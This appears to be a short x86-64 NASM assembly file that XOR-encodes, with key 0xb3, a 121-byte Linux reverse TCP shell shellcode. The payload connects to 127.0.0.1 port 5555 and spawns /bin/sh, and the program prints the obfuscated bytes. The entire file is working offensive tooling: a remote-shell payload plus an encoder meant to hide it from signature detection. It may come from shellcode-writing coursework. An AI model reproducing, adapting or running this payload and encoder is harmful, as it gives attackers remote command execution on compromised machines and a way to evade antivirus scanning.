
global _start

segment .data

    key equ       0xb3
    length equ    121
    shellcode: db 0x6a,0x29,0x58,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x99,0x0f,0x05,0x48,0x89,0xc5,0x48,0xb8,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x02,0x50,0x48,0xb8,0x03,0x01,0x14,0xb2,0x7e,0x01,0x01,0x03,0x48,0x31,0x04,0x24,0x6a,0x2a,0x58,0x48,0x89,0xef,0x6a,0x10,0x5a,0x48,0x89,0xe6,0x0f,0x05,0x6a,0x03,0x5e,0x48,0xff,0xce,0x78,0x0b,0x56,0x6a,0x21,0x58,0x48,0x89,0xef,0x0f,0x05,0xeb,0xef,0x6a,0x68,0x48,0xb8,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x2f,0x73,0x50,0x48,0x89,0xe7,0x68,0x72,0x69,0x01,0x01,0x81,0x34,0x24,0x01,0x01,0x01,0x01,0x31,0xf6,0x56,0x6a,0x08,0x5e,0x48,0x01,0xe6,0x56,0x48,0x89,0xe6,0x31,0xd2,0x6a,0x3b,0x58,0x0f,0x05

section .text

_start:

    lea rsi, [shellcode]
    mov rcx, 0x00

    xor_loop:
        mov al,  byte [rsi+rcx]
        xor al,  key
        mov byte [rsi+rcx], al
        inc rcx
        cmp rcx, length
        jne xor_loop

    lea rsi, [shellcode]
    mov rdi, 0x01
    lea rdx, [length]
    mov rax, 0x01
    syscall

    mov rbx, 0x00
    mov rax, 0x3c
    syscall
